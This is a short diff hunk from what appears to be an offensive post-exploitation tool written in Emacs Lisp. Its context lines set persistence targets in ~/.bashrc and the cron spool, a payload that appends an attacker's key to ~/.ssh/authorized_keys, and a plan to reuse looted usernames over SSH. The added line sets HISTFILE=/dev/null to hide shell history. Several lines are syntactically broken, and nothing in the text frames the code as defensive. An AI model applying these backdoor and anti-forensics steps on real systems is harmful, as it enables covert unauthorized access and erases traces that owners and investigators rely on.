@@ -18,6 +18,7 @@
 (defun persistence)
 (defvar persistence-target "~/.bashrc" "/var/spool/cron/"(user-login-name))
 (defvar persistence-payload "echo "ka0x@dev >>/~/.ssh/authorized_keys"")
+(defvar persistence-amnesia "HISTFILE=/dev/null")
 (defvar callback  "") ; Parse Loot file for username, try to ssh using it and notif on success
 
 (defun privilege-esc)
